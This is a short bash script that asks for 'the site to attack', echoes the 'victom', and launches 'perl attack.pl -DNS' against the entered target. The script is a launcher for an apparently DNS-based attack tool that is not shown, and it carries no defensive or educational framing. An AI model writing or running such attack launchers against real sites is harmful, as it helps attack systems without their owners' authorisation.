#! /bin/bash
echo "enter the site to attack:";
read vic
echo "the victom is " $vic;
perl attack.pl -DNS $vic
